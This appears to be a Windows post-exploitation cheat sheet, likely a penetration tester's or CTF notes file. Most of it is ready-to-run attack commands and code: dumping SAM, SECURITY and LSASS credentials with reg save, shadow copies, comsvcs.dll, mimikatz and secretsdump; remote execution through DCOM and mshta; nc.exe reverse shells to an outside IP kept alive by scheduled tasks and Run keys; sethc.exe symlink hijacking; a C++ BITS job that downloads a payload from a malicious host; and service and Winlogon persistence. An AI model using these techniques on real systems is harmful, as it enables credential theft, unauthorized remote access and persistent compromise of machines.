

- ##### To dump the SAM, SECURITY AND SYSTEM registry hives :
```powershell
reg save HKLM\SAM SAM & reg save HKLM\SECURITY SECURITY & reg save HKLM\SYSTEM SYSTEM
```





- Extracting credentials from SAM, SECURITY AND SYSTEM hives using impacket-secretsdump.
```powershell
secretsdump.py -sam <SAM> -system <SYSTEM> [-security <SECURITY>] LOCAL
```





- ##### Code Execution with COM/DCOM on a remote host:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET IP"))
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Calc.exe",$null,$null,"7")
```




- ##### Executing an hta file from a remote url with mshta:
```powershell
mshta.exe http://192.168.180.84/pwn.hta 
```




- Creating and deleting a scheduled task(persistence):
```powershell
schtasks /create /sc minute /mo 2 /tn "Gibh me shell" /tr 'C:\Users\drbrown.HOSPITAL\Documents\nc.exe 10.10.16.54 4444 -e cmd.exe'

schtasks /delete /tn "Gibh me shell" /f
```





-  Enumerating SMB hosts in a network with nbtscan:
```powershell
nbtscan –v –s : x.x.x.x/24 | cut -d “:“ –f 1 > smb-hosts.txt
```





- Establishing Persistence via registry keys:
```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Not Malware" /t REG_SZ /d "C:\Users\drbrown.HOSPITAL\Documents\nc.exe 10.10.16.54 4444 -e cmd.exe"
```





- Dumping LSASS memory with comsvcs.dll:
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 632 lsass.dmp full
```





- Extracting creds from the LSASS dump using mimikatz and pypykatz:
```powershell
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords 



pypykatz lsa mimidump lsass.dump
```





- Dumping SAM,SECURITY AND SYSTEM registry hive on hardened system by creating a shadow copy using wmic:
```powershell
#Creating the shadow copy of the C:\ Drive
wmic shadowcopy call create Volume='C:\'


# Lists the shadow copy volume configured in order to retrieve the created shadow copy ID.
wmic shadowcopy


# Dumping the registry hives
cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SAM
<EXPORTED_SAM>"

cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SYSTEM
<EXPORTED_SYSTEM>"

cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SECURITY
<EXPORTED_SECURITY>"

# delete all instances of shadowcopy volumes.
wmic delete
```




- Parsing Bloohound's `user.json` file to look for credentials in the userdescrption:
```bash
cat users.json | jq '.data[].Properties | select(.enabled==true) | .name + " " + .description'
```



- Modifying an existing service for persistence 
```powershell

sc.exe list state=all #List all the services
sc.exe qc <TargetService> #retrieve info about the service

sc.exe config <TargetService> binpath="pathtomaliciousexe" start=auto obj="Local System" #Manipulating the exe path and setting to run as system on startup

```




- Abusing Symlinks for persistence (Accessibility):

A symlink is a type of file that contains a reference to another file or directory.In this context, an attacker would create a symlink that points from a legitimate Accessibility feature executable (like sethc.exe for Sticky Keys) to a malicious executable. When the system or a user tries to access the original file or feature, they are unknowingly redirected to the malicious file.

```C++
#include <windows.h>

#include <iostream>

int main() {

// Path to the legitimate binary (e.g., Sticky Keys)

const char* legitBinaryPath ="C:\\Windows\\System32\\sethc.exe";

// Path to the malicious binary

const char* maliciousBinaryPath ="C:\\path\\to\\malicious.exe";

// Delete the original file (requires administrative privileges)

DeleteFile(legitBinaryPath);

// Create the symbolic link
CreateSymbolicLink(legitBinaryPath, maliciousBinaryPath, 0) 
return 0;

}
```



- Abusing BITSADMIN for persistence

BITS (Background Intelligent Transfer Service) is a component of Microsoft Windows, which facilitates asynchronous,prioritized, and throttled transfer of files between machines using idle network bandwidth. BITS is commonly used for Windows updates and other background downloads. BITS jobs can be configured to retry upon failure and can persist across reboots, they offer a stealthy way to ensure that malicious payloads are consistently updated or downloaded.


```C++
#include <bits.h>

#include <windows.h>

#include <iostream>

int main() {

HRESULT hr;

IBackgroundCopyManager *pBitsManager = NULL;

IBackgroundCopyJob *pJob = NULL;

GUID jobGUID;

CoInitialize(NULL);

CoCreateInstance(__uuidof(BackgroundCopyManager), NULL, CLSCTX_LOCAL_SERVER, __uuidof(IBackgroundCopyManager), (void**)&pBitsManager);

pBitsManager->CreateJob(L"Malicious Download", BG_JOB_TYPE_DOWNLOAD, &jobGUID, &pJob);

pJob->AddFile(L"http://malicious.example.com/payload.exe"
, L"C:\\path\\to\\local\\payload.exe");

pJob->SetMinimumRetryDelay(60); // Retry after 60 seconds if failed
pJob->SetNoProgressTimeout(604800); // 1 week timeout for job completion
pJob->SetFlags(BG_JOB_ENUM::BG_JOB_TYPE_DOWNLOAD | BG_JOB_ENUM::BG_JOB_PERSISTENT);

pJob->Resume();
pJob->Release();
pBitsManager->Release();
CoUninitialize();
return 0;
}
```




- Reading senstive data from xml files:
```powershell
Import-CliXml -Path '<path to the xml file>'
```


- browsing the directory tree in mssql server:
```SQL
EXEC xp_dirtree "path", 1, 1;
```



- Modifying the registry to execute a command/binary whenever the user logs in: (Need Admin Access)

```powershell
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon" /v "mpnotify" /t REG_SZ /d "The command to be executed"


```

